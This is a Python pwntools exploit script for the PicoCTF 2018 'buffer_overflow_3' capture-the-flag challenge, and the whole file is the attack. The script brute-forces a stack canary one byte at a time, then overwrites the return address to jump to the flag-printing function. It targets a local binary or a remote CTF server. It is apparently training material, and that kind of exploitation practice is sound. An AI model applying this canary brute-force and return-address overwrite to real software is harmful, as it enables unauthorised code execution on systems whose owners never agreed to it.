import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./PicoCTF_2018_buffer_overflow_3')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./PicoCTF_2018_buffer_overflow_3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',25116)
			elf=ELF('./PicoCTF_2018_buffer_overflow_3')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		io.recv()
		io.close()
		pay='a'*0x20
		i=0
		flag=0
		sss="Ok... Now Where's the Flag?"
		while True:
			io=process('./PicoCTF_2018_buffer_overflow_3')
			io.recv()
			io.sendline('100')
			io.recv()
			io.send(pay+chr(i))
			sleep(0.1)
			data=io.recv()
			if sss in data :
				pay+=chr(i)
				i=0
				flag+=1

			if "flag" in data :
				print data
				pause()

			if flag == 4 :
				pay+='a'*0x10+p32(0x080486eb)

			i+=1
			io.close()




		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue